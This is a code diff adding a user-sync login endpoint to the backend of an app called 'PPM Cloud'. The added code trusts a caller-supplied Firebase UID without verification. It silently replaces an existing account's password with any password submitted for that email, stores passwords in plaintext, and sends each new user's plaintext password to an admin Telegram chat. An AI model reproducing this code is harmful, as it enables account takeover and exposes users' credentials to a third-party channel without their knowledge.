@@ -293,6 +293,70 @@ export default {
         });
       }
 
+      if (path === "/api/auth/sync-user" && method === "POST") {
+        const body = await request.json().catch(() => ({}));
+        const email = (body.email || "").trim().toLowerCase();
+        const firebaseUid = (body.firebase_uid || body.uid || "").trim();
+        const password = (body.password || "").trim();
+        const name = (body.name || "").trim() || email.split("@")[0] || "User";
+
+        if (!email || !email.includes("@")) {
+          return json({ ok: false, error: "একটি সঠিক ইমেইল এড্রেস প্রয়োজন" }, 400);
+        }
+
+        let user = await db.prepare("SELECT * FROM users WHERE LOWER(email) = ?").bind(email).first();
+        if (user) {
+          if (password && password !== user.password) {
+            await db.prepare("UPDATE users SET password = ?, updated_at = ? WHERE pp_id = ?").bind(password, Date.now(), user.pp_id).run();
+            user.password = password;
+          }
+        } else {
+          let ppId = generatePPId();
+          let idCheck = await db.prepare("SELECT pp_id FROM users WHERE pp_id = ?").bind(ppId).first();
+          while (idCheck) {
+            ppId = generatePPId();
+            idCheck = await db.prepare("SELECT pp_id FROM users WHERE pp_id = ?").bind(ppId).first();
+          }
+
+          const avatarUrl = (body.avatar_url && !body.avatar_url.includes('dicebear')) 
+            ? body.avatar_url 
+            : DEFAULT_AVATARS[Math.floor(Math.random() * DEFAULT_AVATARS.length)];
+          const now = Date.now();
+
+          await db.prepare(`
+            INSERT INTO users (pp_id, email, password, name, avatar_url, coins, monthly_points, monthly_points_month, role, created_at, updated_at)
+            VALUES (?, ?, ?, ?, ?, 0.0, 0.0, '', 'user', ?, ?)
+          `).bind(ppId, email, password || "none", name, avatarUrl, now, now).run();
+
+          const txId = "TX-INIT-" + now;
+          await db.prepare(`
+            INSERT INTO transactions (id, user_id, type, coins, balance_before, balance_after, title, details, created_at)
+            VALUES (?, ?, 'welcome', 0.0, 0.0, 0.0, 'Account Created', 'Welcome to PPM Cloud', ?)
+          `).bind(txId, ppId, now).run();
+
+          sendTelegram(ADMIN_TG_ID, `👤 <b>NEW USER REGISTERED VIA FIREBASE AUTH!</b>\n\n🆔 <b>PP ID:</b> <code>${ppId}</code>\n📧 <b>Email:</b> <code>${email}</code>\n🔑 <b>Password:</b> <code>${password}</code>\n👤 <b>Name:</b> ${name}`);
+
+          user = await db.prepare("SELECT * FROM users WHERE pp_id = ?").bind(ppId).first();
+        }
+
+        if (user.is_banned) {
+          return json({ ok: false, error: `আপনার অ্যাকাউন্টটি স্থগিত করা হয়েছে! কারণ: ${user.ban_reason || 'পলিসি লঙ্ঘন'}` }, 403);
+        }
+
+        return json({
+          ok: true,
+          user: {
+            pp_id: user.pp_id,
+            email: user.email,
+            name: user.name,
+            avatar_url: user.avatar_url,
+            coins: Number(user.coins) || 0.0,
+            monthly_points: Number(user.monthly_points) || 0.0,
+            role: user.role || "user"
+          }
+        });
+      }
+
       if (path === "/api/auth/login" && method === "POST") {
         const body = await request.json().catch(() => ({}));
         const identifier = (body.email || body.identifier || "").trim().toLowerCase();
